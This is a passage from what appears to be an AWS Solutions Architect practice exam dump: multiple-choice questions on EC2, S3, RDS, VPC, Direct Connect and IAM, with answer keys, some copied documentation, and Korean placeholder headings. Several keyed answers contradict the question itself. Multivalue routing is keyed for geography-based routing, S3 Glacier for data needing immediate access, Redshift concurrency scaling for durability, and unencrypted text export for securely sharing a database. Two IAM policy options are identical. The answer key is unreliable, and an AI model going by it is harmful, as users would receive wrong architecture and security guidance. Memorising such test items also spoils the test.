AWS Global Accelerator\nC. Amazon Route 53\nD. Amazon S3 Transfer Acceleration \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company runs an internal browser-based application The application runs on Amazon EC2 instances behind an Application Load Balancer The instances run in an Amazon EC2 Auto Scaling group across multiple Availability Zones The Auto Scaling group scales up to 20 instances during work hours, but scales down to 2 instances overnight Staff are complaining that the application is very slow when the day begins, although it runs well by mid-morning. How should the scaling be changed to address the staff complaints and keep costs to a minimum?\nA. Implement a scheduled action that sets the desired capacity to 20 shortly before the office opens\nB. Implement a step scaling action triggered at a lower CPU threshold, and decrease the cooldown period.\nC. Implement a target tracking action triggered at a lower CPU threshold and decrease the cooldown period\nD. Implement a scheduled action that sets the minimum and maximum capacity to 20 shortly before the office opens \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company wants to build a scalable key management infrastructure to support developers who need to encrypt data in their applications. What should a solutions architect do to reduce the operational burden?\nA. Use multi-factor authentication (MFA) to protect the encryption keys B. Use AWS Key Management Service (AWS KMS) to protect the encryption keys C. Use AWS Certificate Manager (ACM) to create, store and assign the encryption keys D. Use an IAM policy to limit the scope of users who have access permissions to protect the encryption keys \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company runs a production application on a fleet of Amazon EC2 instances The application reads the data from an Amazon SQS queue and processes the messages in parallel. The message volume is unpredictable and often has intermittent traffic. This application should continually process messages without any downtime Which solution meets these requirements MOST cost-effectively?\nA. Use Spot Instances exclusively to handle the maximum capacity required B. Use Reserved Instances exclusively to handle the maximum capacity required C. Use Reserved Instances for the baseline capacity and use Spot InstaKes to handle additional capacity D. Use Reserved instances for the baseline capacity and use On-Demand Instances to handle additional capacity \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A solutions architect must create a highly available bastion host architecture. The solution needs to be resilient within a single AWS Region and should require only minimal effort to maintain. What should the solutions architect do to meet these requirements?\nA. Create a Network Load Balancer backed by an Auto Scaling group with a UDP listener. B. Create a Network Load Balancer backed by a Spot Fleet with instances in a group with instances in a partition placement group. C. Create a Network Load Balancer backed by the existing serves in different Availability Zones as the target. D. Create a Network Load Balancer backed by an Auto Scaling with instances in multiple Availability zones as the target \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A development team needs to host a website that will be accessed by other teams. The website contents.consist of HTML, CSS, client side JavaScript, and images. Which method is the MOST cost-effective for hosting the website?\nA. Containerize the website and host it in AWS Fargate\nB. Create an Amazon S3 bucket and host the website there.\nC. Deploy a web server on an Amazon EC2 instance to host the website.\nD. Configure an Application Load Balancer with an AWS Lambda target that uses the Express is framework \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION a website on Amazon S3. The website serves petabytes of outbound traffic monthly, which accounts for most of the company\u0026rsquo;s AWS costs. What should a solutions architect do to reduce costs?\nA. Configure Amazon CloudFront with the existing website as the origin.\nB. Move the website to Amazon EC2 with Amazon EBS volumes for storage.\nC. Use AWS Global Accelerator and specify the existing website as the endpoint.\nD. Rearchitect the website to run on a combination of Amazon API Gateway and AWS Lambda. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A public-facing web application queries a database hosted on a Amazon EC2 instance in a private subnet. A large number of queries involve multiple table joins, and the application performance has been degrading due to an increase in complex queries. The application team will be performing updates to improve performance. What should a solutions architect recommend to the application team? (Select TWO.)\nA. Cache query data in Amazon SQS B. Create a read replica to offload queries C. Migrate the database to Amazon Athena D. Implement Amazon DynamoDB Accelerator to cache data. E. Migrate the database to Amazon RDS \r문제 풀이\r...\r\rAnswer: B E \r\r\rB E\n   QUESTION A solutions architect needs to ensure that API calls to Amazon DynamoDB from Amazon EC2 instances in a VPC do not traverse the internet What should the solutions architect do to accomplish this? (Select TWO )\nA. Create a route table entry for the endpoint B. Create a gateway endpoint for DynamoDB C. Create a new DynamoDB table that uses the endpoint D. Create an ENI for the endpoint in each of the subnets of the VPC E. Create a security group entry in the default security group to provide access \r문제 풀이\r...\r\rAnswer: A B Explanation A VPC endpoint enables you to privately connect your VPC to supported AWS services and VPC endpoint services powered by AWS PrivateLink without requiring an internet gateway, NAT device, VPN connection, or AWS Direct Connect connection. Instances in your VPC do not require public IP addresses to communicate with resources in the service. Traffic between your VPC and the other service does not leave the Amazon network. Gateway endpoints A gateway endpoint is a gateway that you specify as a target for a route in your route table for traffic destined to a supported AWS service. The following AWS services are supported: Amazon S3 DynamoDB https://docs.aws.amazon.com/vpc/latest/userguide/vpc-endpoints.html\r\r\r\r   QUESTION A company has a large Microsoft SharePoint deployment running on-premises that requires Microsoft Windows shared file storage. The company wants to migrate this workload to the AWS Cloud and is considering various storage options. The storage solution must be highly available and integrated with Active Directory for access control. Which solution will satisfy these requirements?\nA. Configure Amazon EFS storage and set the Active Directory domain for authentication. B. Create an SMB file share on an AWS Storage Gateway file gateway in two Availability Zones. C. Create an Amazon S3 bucket and configure Microsoft Windows Server to mount it as a volume. D. Create an Amazon FSx for Windows File Server file system on AWS and set the Active Directory domain for authentication. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is running an online transaction processing (OLTP) workload on AWS. This workload uses an unencrypted Amazon RDS DB instance in a Multi-AZ deployment. Daily database snapshots are taken from this instance. What should a solutions architect do to ensure the database and snapshots are always encrypted moving forward?\nA. Encrypt a copy of the latest DB snapshot. Replace existing DB instance by restoring the encrypted snapshot. B. Create a new encrypted Amazon Elastic Block Store (Amazon EBS) volume and copy the snapshots lo it. Enable encryption on the DB instance. C. Copy the snapshots and enable encryption using AWS Key Management Service (AWS KMS). Restore encrypted snapshot to an existing DB instance. D. Copy the snapshots to an Amazon S3 bucket that is encrypted using server-side encryption with AWS Key Management Service (AWS KMS) managed keys (SSE-KMS). \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company wants to host its web application on AWS using multiple Amazon EC2 instances across different AWS Regions Since the application content will be specific to each geographic region, the client requests need to be routed to the server that hosts the content for that clients Region. What should a solutions architect do to accomplish this?\nA. Configure Amazon Route 53 with a latency routing policy. B. Configure Amazon Route 53 with a weighted routing policy. C. Configure Amazon Route 53 with a geolocation routing policy D. Configure Amazon Route 53 with a multivalue answer routing policy \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A mobile gaming company runs application servers on Amazon EC2 instances. The servers receive updates from players every 15 minutes. The mobile game creates a JSON object of the progress made in the game since the last update, and sends the JSON object to an Application Load Balancer. As the mobile game is played, game updates are being lost. The company wants to create a durable way to get the updates in older. What should a solutions architect recommend to decouple the system?\nA. Use Amazon Kinesis Data Streams to capture the data and store the JSON object in Amazon S3. B. Use Amazon Kinesis Data Firehose to capture the data and store the JSON object in Amazon S3. C. Use Amazon Simple Queue Service (Amazon SQS) FIFO queues to capture the data and EC2 instances to process the messages in the queue. D. Use Amazon Simple Notification Service (Amazon SNS) to capture the data and EC2 instances to process the messages sent to the Application Load Balancer. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company is planning to migrate a legacy application to AWS. The application currently uses NFS to communicate to an on-premises storage solution to store application data. The application cannot be modified to use any other communication protocols other than NFS for this purpose. Which storage solution should a solutions architect recommend for use after the migration?\nA. AWS DataSync B. Amazon Elastic Block Store (Amazon EBS) C. Amazon Elastic File System (Amazon EFS) D. Amazon EMR File System (Amazon EMRFS) \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A solutions architect is moving the static content from a public website hosted on Amazon EC2 instances to an Amazon S3 bucket. An Amazon CloudFront distribution will be used to deliver the static assets. The security group used by the EC2 instances restricts access to a limited set of IP ranges. Access to the static content should be similarly restricted. Which combination of steps will meet these requirements? (Select TWO.)\nA. Create an origin access identity (OAI) and associate it with the distribution. Change the permissions in the bucket policy so that only the OAI can read the objects. B. Create an AWS WAF web ACL that includes the same IP restrictions that exist in the EC2 security group. Associate this new web ACL with the CloudFront distribution. C. Create a new security group that includes the same IP restrictions that exist in the current EC2 security group. Associate this new security group with the CloudFront distribution. D. Create a new security group that includes the same IP restrictions that exist in the current EC2 security group. Associate this new security group with the S3 bucket hosting the static content. E. Create a new IAM role and associate the role with the distribution. Change the permissions either on the S3 bucket or on the files within the S3 bucket so that only the newly created IAM role has read and download permissions. \r문제 풀이\r...\r\rAnswer: A B \r\r\r   QUESTION A company wants to deploy a shared file system for its .NET application servers and Microsoft SQL Server database running on Amazon EC2 instance with Windows Server 2016. The solution must be able to be integrated in to the corporate Active Directory domain, be highly durable, be managed by AWS, and provided levels of throuput and IOPS. Which solution meets these requirements?\nA. Use Amazon FSx for Windows File Server B. Use Amazon Elastic File System (Amazon EFS) C. Use AWS Storage Gateway in file gateway mode. D. Deploy a Windows file server on two On Demand instances across two Availability Zones. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company that develops web applications has launched hundreds of Application Load Balancers (ALBs) in multiple Regions. The company wants to create an allow list (or the IPs of all the load balancers on its firewall device. A solutions architect is looking for a one-time, highly available solution to address this request, which will also help reduce the number of IPs that need to be allowed by the firewall. What should the solutions architect recommend to meet these requirements?\nA. Create a AWS Lambda function to keep track of the IPs for all the ALBs in different Regions Keep refreshing this list. B. Set up a Network Load Balancer (NLB) with Elastic IPs. Register the private IPs of all the ALBs as targets to this NLB. C. Launch AWS Global Accelerator and create endpoints for all the Regions. Register all the ALBs in different Regions to the corresponding endpoints D. Set up an Amazon EC2 instance, assign an Elastic IP to this EC2 instance, and configure the instance as a proxy to forward traffic to all the ALBs. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A recent analysis of a company\u0026rsquo;s IT expenses highlights the need to reduce backup costs. The company\u0026rsquo;s chief information officer wants to simplify the on-premises backup infrastructure and reduce costs by eliminating the use of physical backup tapes. The company must preserve the existing investment in the on-premises backup applications and workflows. What should a solutions architect recommend?\nA. Set up AWS Storage Gateway to connect with the backup applications using the NFS interface. B. Set up an Amazon EFS file system that connects with the backup applications using the NFS interface C. Set up an Amazon EFS file system that connects with the backup applications using the iSCSI interface D. Set up AWS Storage Gateway to connect with the backup applications using the iSCSI-virtual tape library (VTL) interface. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company wants to share forensic accounting data is stored in an Amazon RDS DB instance with an external auditor. The Auditor has its own AWS account and requires its own copy of the database. How should the company securely share the database with the auditor?\nA. Create a read replica of the database and configure IAM standard database authentication to grant the auditor access. B. Copy a snapshot of the database to Amazon S3 and assign an IAM role to the auditor to grant access to the object in that bucket. C. Export the database contents to text files, store the files in Amazon S3, and create a new IAM user for the auditor with access to that bucket. D. Make an encrypted snapshot of the database, share the snapshot, and allow access to the AWS Key Management Service (AWS KMS) encryption key. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has a 10 Gbps AWS Direct Connect connection from its on-premises servers to AWS. The workloads using the connection are critical. The company requires a disaster recovery strategy with maximum resiliency that maintains the current connection bandwidth at a minimum. What should a solutions architect recommend?\nA. Set up a new Direct Connect connection in another AWS Region. B. Set up a new AWS managed VPN connection in another AWS Region. C. Set up two new Direct Connect connections: one in the current AWS Region and one in another Region. D. Set up two new AWS managed VPN connections: one in the current AWS Region and one in another Region. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has created a VPC with multiple private subnets in multiple Availability Zones (AZs) and one public subnet in one of the AZs. The public subnet is used to launch a NAT gateway. There are instance in the private subnet that use a NAT gateway to connect to the internet. In case is used of an AZ failure, the company wants to ensure that the instance are not all experiencing internet connectivity issues and that there is a backup plan ready. Which solution should a solutions architect recommend that is MOST highly available?\nA. Create a new public subnet with a NAT gateway in the same AZ Distribute the traffic between the two NAT gateways B. Create an Amazon EC2 NAT instance in a now public subnet Distribute the traffic between the NAT gateway and the NAT instance C. Create public subnets In each AZ and launch a NAT gateway in each subnet Configure the traffic from the private subnets In each A2 to the respective NAT gateway D. Create an Amazon EC2 NAT instance in the same public subnet Replace the NAT gateway with the NAT instance and associate the instance with an Auto Scaling group with an appropriate scaling policy. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A solutions architect is tasked with transferring 750 TB of data from a network-attached file system located at a branch office to Amazon S3 Glacier The solution must avoid saturating the branch office\u0026rsquo;s low-bandwidth internet connection What is the MOST cost-effective solution1?\nA. Create a site-to-site VPN tunnel to an Amazon S3 bucket and transfer the files directly Create a bucket policy to enforce a VPC endpoint B. Order 10 AWS Snowball appliances and select an S3 Glacier vault as the destination Create a bucket policy to enforce a VPC endpoint C. Mount the network-attached file system to Amazon S3 and copy the files directly. Create a lifecycle policy to transition the S3 objects to Amazon S3 Glacier D. Order 10 AWS Snowball appliances and select an Amazon S3 bucket as the destination. Create a lifecycle policy to transition the S3 objects to Amazon S3 Glacier \r문제 풀이\r...\r\rAnswer: D Explanation Regional Limitations for AWS Snowball The AWS Snowball service has two device types, the standard Snowball and the Snowball Edge. The following table highlights which of these devices are available in which regions. Limitations on Jobs in AWS Snowball The following limitations exist for creating jobs in AWS Snowball: For security purposes, data transfers must be completed within 90 days of the Snowball being prepared. Currently, AWS Snowball Edge device doesn\u0026rsquo;t support server-side encryption with customer-provided keys (SSE-C). AWS Snowball Edge device does support server-side encryption with Amazon S3- managed encryption keys (SSE-S3) and server-side encryption with AWS Key Management Servicemanaged keys (SSE-KMS). For more information, see Protecting Data Using Server-Side Encryption in the Amazon Simple Storage Service Developer Guide. In the US regions, Snowballs come in two sizes: 50 TB and 80 TB. All other regions have the 80 TB Snowballs only. If you\u0026rsquo;re using Snowball to import data, and you need to transfer more data than will fit on a single Snowball, create additional jobs. Each export job can use multiple Snowballs. The default service limit for the number of Snowballs you can have at one time is 1. If you want to increase your service limit, contact AWS Support. All objects transferred to the Snowball have their metadata changed. The only metadata that remains the same is filename and filesize. All other metadata is set as in the following example: -rw-rw-r\u0026ndash; 1 root root [filesize] Dec 31 1969 [path/filename] Object lifecycle management To manage your objects so that they are stored cost effectively throughout their lifecycle, configure their Amazon S3 Lifecycle. An S3 Lifecycle configuration is a set of rules that define actions that Amazon S3 applies to a group of objects. There are two types of actions: Transition actions-Define when objects transition to another storage class. For example, you might choose to transition objects to the S3 Standard-IA storage class 30 days after you created them, or archive objects to the S3 Glacier storage class one year after creating them. Expiration actions-Define when objects expire. Amazon S3 deletes expired objects on your behalf. The lifecycle expiration costs depend on when you choose to expire objects. https://docs.aws.amazon.com/snowball/latest/ug/limits.html https://docs.aws.amazon.com/AmazonS3/latest/dev/object-lifecycle-mgmt.html\r\r\r\r   QUESTION A solution architect is designing a hybrid application using the AWS cloud. The network between the on-premises data center and AWS will use an AWS Direct Connect (DX) connection. The application connectivity between AWS and the on-premises data center must be highly resilient. Which DX configuration should be implemented to meet these requirements?\nA. Configure a DX connection with a VPN on top of it. B. Configure DX connections at multiple DX locations. C. Configure a DX connection using the most reliable DX partner. D. Configure multiple virtual interfaces on top of a DX connection. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company has implemented one of its microservices on AWS Lambda that accesses an Amazon DynamoDB table named Books. A solutions architect is design an IAM policy to be attached to the Lambda function\u0026rsquo;s IAM role, giving it access to put, update, and delete items in the Books table. the IAM policy must prevent function from performing any other actions on the Books table or any other. Which IAM policy would fulfill these needs and provide the LEAST privileged access?\nA. Option A\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;PutUpdateDeleteOnBooks\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;dynamodb: PutItem\u0026#34;, \u0026#34;dynamodb: UpdateItem\u0026#34;, \u0026#34;dynamodb: DeleteItem\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:dynamodb:us-west-2:123456789012:table/Books\u0026#34; } ] }  B. Option B\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;PutUpdateDeleteOnBooks\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;dynamodb: PutItem\u0026#34;, \u0026#34;dynamodb: UpdateItem\u0026#34;, \u0026#34;dynamodb: DeleteItem\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:dynamodb:us-west-2:123456789012:table/*\u0026#34; } ] }  C. Option C\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;PutUpdateDeleteOnBooks\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;dynamodb: *\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:dynamodb:us-west-2:123456789012:table/Books\u0026#34; }, { \u0026#34;Sid\u0026#34;: \u0026#34;PutUpdateDeleteOnBooks\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Deny\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;dynamodb: *\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:dynamodb:us-west-2:123456789012:table/Books\u0026#34; }, ] }  D. Option D\n{ \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;PutUpdateDeleteOnBooks\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;dynamodb: PutItem\u0026#34;, \u0026#34;dynamodb: UpdateItem\u0026#34;, \u0026#34;dynamodb: DeleteItem\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:dynamodb:us-west-2:123456789012:table/Books\u0026#34; } ] } \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has applications hosted on Amazon EC2 instances with IPv6 addresses. The applications must initiate communications with other external applications using the internet. However, the company\u0026rsquo;s security policy states that any external service cannot initiate a connection to the EC2 instances. What should a solutions architect recommend to resolve this issue?\nA. Create a NAT gateway and make it the destination of the subnet\u0026rsquo;s route table B. Create an internet gateway and make it the destination of the subnet\u0026rsquo;s route table C. Create a virtual private gateway and make it the destination of the subnet\u0026rsquo;s route table D. Create an egress-only internet gateway and make it the destination of the subnet\u0026rsquo;s route table \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company has an application that generates a large number of files, each approximately 5 MB in size. The files are stored in Amazon S3. Company policy requires the files to be stored for 4 years before they can be deleted. Immediate accessibility is always required as the files contain critical business data that is not easy to reproduce. The files are frequently accessed in the first 30 days of the object creation but are rarely accessed after the first 30 days. Which storage solution is MOST cost-effective?\nA. Create an S3 bucket lifecycle policy to move files from S3 Standard to S3 Glacier 30 days from object creation. Delete the files 4 years after object creation. B. Create an S3 bucket lifecycle policy to move files from S3 Standard to S3 One Zone-Infrequent Access (S3 One Zone-IA) 30 days from object creation. Delete the files 4 years after object creation. C. Create an S3 bucket lifecycle policy to move files from S3 Standard to S3 Standard-Infrequent Access (S3 Standard-IA) 30 days from object creation. Delete the files 4 years after object creation. D. Create an S3 bucket lifecycle policy to move files from S3 Standard to S3 Standard-Infrequent Access (S3 Standard-IA) 30 days from object creation. Move the files to S3 Glacier 4 years after object creation. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A solutions architect is designing a new API using Amazon API Gateway that will receive requests from users The volume of requests is highly variable, several hours can pass without receiving a single request The data processing will take place asynchronously but should be completed within a few seconds after a request is made Which compute service should the solutions architect have the API invoke to deliver the requirements at the lowest cost?\nA. An AWS Glue job B. An AWS Lambda function C. A containerized service hosted in Amazon Elastic Kubernetes Service (Amazon EKS) D. A containerized service hosted in Amazon ECS with Amazon EC2 \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has a three-tier image-sharing application it uses an Amazon EC2 instance for the front-end layer, another for the backend tier, and a third for the MySQL database A solutions architect has been tasked with designing a solution that is highly available, and requires the least amount of changes to the application.\nWhich solution meets these requirements?\nA. Use Amazon S3 to host the front-end layer and AWS Lambda functions for the backend layer Move the database to an Amazon DynamoDB table and use Amazon S3 to store and serve users' images B. Use load-balanced Multi-AZ AWS Elastic Beanstalk environments for the front-end and backend layers Move the database to an Amazon RDS instance with multiple read replicas to store and serve users' images. C. Use Amazon S3 to host the front-end layer and a fleet of Amazon EC2 instances in an Auto Scaling group for the backend layer Move the database to a memory optimized instance type to store and serve users' images D. Use load-balanced Multi-AZ AWS Elastic Beanstalk environments for the front-end and backend layers Move the database to an Amazon RDS instance with a Multi-AZ deployment Use Amazon S3 to store and serve users' images \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company has data stored in an on-premises data center that is used by several onpremises applications. The company wants to maintain its existing application environment and be able to use AWS services for data analytics and future visualizations. Which storage service should a solutions architect recommend?\nA. Amazon Redshift B. AWS Storage Gateway for files C. Amazon Elastic Block Store (Amazon EBS) D. Amazon Elastic File System (Amazon EFS) \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A solutions architect is designing a two-tier web application The application consists of a public-facing web tier hosted on Amazon EC2 in public subnets The database tier consists of Microsoft SQL Server running on Amazon EC2 in a private subnet Security is a high priority for the company How should security groups be configured in this situation? (Select TWO )\nA. Configure the security group for the web tier to allow inbound traffic on port 443 from 0 0 0 0/0 B. Configure the security group for the web tier to allow outbound traffic on port 443 from 0 0 0 0/0 C. Configure the security group for the database tier to allow inbound traffic on port 1433 from the security group for the web tier D. Configure the security group for the database tier to allow outbound traffic on ports 443 and 1433 to the security group for the web tier E. Configure the security group for the database tier to allow inbound traffic on ports 443 and 1433 from the security group for the web tier \r문제 풀이\r...\r\rAnswer: A C \r\r\r   QUESTION A company recently launched its website to serve content to its global user base. The company wants to store and accelerate the delivery of static content to its users by leveraging Amazon CloudFront with an Amazon EC2 instance attached as its origin. How should a solutions architect optimize high availability for the application?\nA. Use Lambda@Edge for CloudFront. B. Use Amazon S3 Transfer Acceleration for CloudFront. C. Configure another EC2 instance in a different Availability Zone as part of the origin group. D. Configure another EC2 instance as part of the origin server cluster in the same Availability Zone. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has two AWS accounts Production and Development There are code changes ready in the Development account to push to the Production account In the alpha phase, only two senior developers on the development team need access to the Production account in the beta phase, more developers might need access to perform testing as well. What should a solutions architect recommend?\nA. Create two policy documents using the AWS Management Console in each account Assign the policy to developers who need access B. Create an IAM role in the Development account Give one IAM role access to the Production account Allow developers to assume the role C. Create an IAM role in the Production account with the trust policy that specifies the Development account. Allow developers to assume the role. D. Create an IAM group in the Production account and add it as a principal in the trust policy that specifies the Production account Add developers to the group \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company\u0026rsquo;s dynamic website is hosted using on-premises servers in the United States. The company is launching its product in Europe and it wants to optimize site loading times for new European users. The site\u0026rsquo;s backend must remain in the United States. The product is being launched in a few days, and an immediate solution is needed What should the solutions architect recommend?\nA. Launch an Amazon EC2 instance in us-east-1 and migrate the site to it B. Move the website to Amazon S3 Use cross-Region replication between Regions. C. Use Amazon CloudFront with a custom origin pointing to the on-premises servers D. Use an Amazon Route 53 geoproximity routing policy pointing to on-premises servers \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A recently acquired company is required to build its own infrastructure on AWS and migrate multiple applications to the cloud within a month Each application has approximately 50 TB of data to be transferred After the migration is complete this company and its parent company will both require secure network connectivity with consistent throughput from their data centers to the applications A solutions architect must ensure one-time data migration and ongoing network connectivity Which solution will meet these requirements?\nA. AWS Direct Connect for both the initial transfer and ongoing connectivity B. AWS Site-to-Site VPN for both the initial transfer and ongoing connectivity C. AWS Snowball for the initial transfer and AWS Direct Connect for ongoing connectivity D. AWS Snowball for the initial transfer and AWS Site-to-Site VPN for ongoing connectivity \r문제 풀이\r...\r\rAnswer: C Explanation https://aws.amazon.com/directconnect/\r\r\r\r   QUESTION A company currently has 250 TB of backup files stored in Amazon S3 in a vendor\u0026rsquo;s proprietary format. Using a Linux-based software application provided by the vendor, the company wants to retrieve files from Amazon S3, transform the files to an industry-standard format, and reupload them to Amazon S3. The company wants to minimize the data transfer charges associated with this conversation. What should a solution architect do to accomplish this?\nA. Install the conversion software as an Amazon S3 batch operation so the data is transformed without leaving Amazon S3. B. Install the conversion software onto an on-premises virtual machines. Perform the transformation and re-upload the files to Amazon S3 from the virtual machine. C. Use AWS Snowball Edge device to expert the data and install the conversion software onto the devices. Perform the data transformation and re-upload the files to Amazon S3 from the Snowball devices. D. Launch an Amazon EC2 instance in the same Region as Amazon S3 and install the conversion software onto the instance. Perform the transformation and re-upload the files to Amazon S3 from the EC2 instance. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company uses Amazon Redshift for its data warehouse. The company wants to ensure high durability for its data in case of any component failure. What should a solutions architect recommend?\nA. Enable concurrency seating. B. Enable cross-Region snapshots. C. Increase the data retention period. D. Deploy Amazon Redshift in Multi-AZ. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is hosting a web application on AWS using a single Amazon EC2 instance that stores user-uploaded documents in an Amazon EBS volume For better scalability and availability the company duplicated the architecture and created a second EC2 instance and EBS volume in another Availability Zone: placing both behind an Application Load Balancer After completing this change users reported that each time they refreshed the website they could see one subset of their documents or the other but never all of the documents at the same time What should a solutions architect propose to ensure users see all of their documents at once?\nA. Copy the data so both EBS volumes contain all the documents B. Configure the Application Load Balancer to direct a user to the server with the documents C. Copy the data from both EBS volumes to Amazon EFS Modify the application to save new documents to Amazon EFS D. Configure the Application Load Balancer to send the request to both servers Return each document from the correct server \r문제 풀이\r...\r\rAnswer: C Explanation https://docs.aws.amazon.com/efs/latest/ug/how-it-works.html#how-it-works-ec2 Amazon EFS provides file storage in the AWS Cloud. With Amazon EFS, you can create a file system, mount the file system on an Amazon EC2 instance, and then read and write data to and from your file system. You can mount an Amazon EFS file system in your VPC, through the Network File System versions 4.0 and 4.1 (NFSv4) protocol. We recommend using a current generation Linux NFSv4.1 client, such as those found in the latest Amazon Linux, Redhat, and Ubuntu AMIs, in conjunction with the Amazon EFS Mount Helper. For instructions, see Using the amazon-efs-utils Tools. For a list of Amazon EC2 Linux Amazon Machine Images (AMIs) that support this protocol, see NFS Support. For some AMIs, you\u0026rsquo;ll need to install an NFS client to mount your file system on your Amazon EC2 instance. For instructions, see Installing the NFS Client. You can access your Amazon EFS file system concurrently from multiple NFS clients, so applications that scale beyond a single connection can access a file system. Amazon EC2 instances running in multiple Availability Zones within the same AWS Region can access the file system, so that many users can access and share a common data source. How Amazon EFS Works with Amazon EC2 https://docs.aws.amazon.com/efs/latest/ug/how-it-works.html#how-it-works-ec2\r\r\r\r   QUESTION A company\u0026rsquo;s legacy application is currently relying on a single-instance Amazon RDS MySQL database without encryption Due to new compliance requirements, all existing and new data in this database must be encrypted How should this be accomplished?\nA. Create an Amazon S3 bucket with server-side encryption enabled Move all the data to Amazon S3 Delete the RDS instance B. Enable RDS Multi-AZ mode with encryption at rest enabled Perform a failover to the standby instance to delete the original instance C. Take a snapshot of the RDS instance Create an encrypted copy of the snapshot Restore the RDS instance from the encrypted snapshot D. Create an RDS read replica with encryption at rest enabled Promote the read replica to master and switch the application over to the new master Delete the old RDS instance. \r문제 풀이\r...\r\rAnswer: C Explanation How do I encrypt Amazon RDS snapshots?\nThe following steps are applicable to Amazon RDS for MySQL, Oracle, SQL Server, PostgreSQL, or MariaDB. Important: If you use Amazon Aurora, you can restore an unencrypted Aurora DB cluster snapshot to an encrypted Aurora DB cluster if you specify an AWS Key Management Service (AWS KMS)\n115 encryption key when you restore from the unencrypted DB cluster snapshot. For more information, see Limitations of Amazon RDS Encrypted DB Instances. Open the Amazon RDS console, and then choose Snapshots from the navigation pane. Select the snapshot that you want to encrypt. Under Snapshot Actions, choose Copy Snapshot. Choose your Destination Region, and then enter your New DB Snapshot Identifier. Change Enable Encryption to Yes. Select your Master Key from the list, and then choose Copy Snapshot. After the snapshot status is available, the Encrypted field will be True to indicate that the snapshot is encrypted. You now have an encrypted snapshot of your DB. You can use this encrypted DB snapshot to restore the DB instance from the DB snapshot. https://aws.amazon.com/premiumsupport/knowledge-center/encrypt-rds-snapshots/\n\r\r\r   QUESTION A company needs a secure connection between its on-premises environment and AWS. This connection does not need high bandwidth and will handle a small amount of traffic. The connection should be set up quickly. What is the MOST cost-effective method to establish this type of connection?\nA. Implement a client VPN B. Implement AWS Direct Connect C. Implement a bastion host on Amazon EC2 53D. D. Implement an AWS Site-to-Site VPN connection. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is running a two-tier ecommerce website using services. The current architect uses a publish-facing Elastic Load Balancer that sends traffic to Amazon EC2 instances in a private subnet. The static content is hosted on EC2 instances, and the dynamic content is retrieved from a MYSQL database. The application is running in the United States. The company recently started selling to users in Europe and Australia. A solution architect needs to design solution so their international users have an improved browsing experience. Which solution is MOST cost-effective?\nA. Host the entire website on Amazon S3. B. Use Amazon CloudFront and Amazon S3 to host static images. C. Increase the number of public load balancers and EC2 instances D. Deploy the two-tier website in AWS Regions in Europe and Austraila. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company has two applications it wants to migrate to AWS. Both applications process a large set of files by accessing the same files at the same time. Both applications need to read the files with low latency. Which architecture should a solutions architect recommend for this situation?\nA. Configure two AWS Lambda functions to run the applications. Create an Amazon EC2 instance with an instance store volume to store the data. B. Configure two AWS Lambda functions to run the applications. Create an Amazon EC2 instance with an Amazon Elastic Block Store (Amazon EBS) volume to store the data. C. Configure one memory optimized Amazon EC2 instance 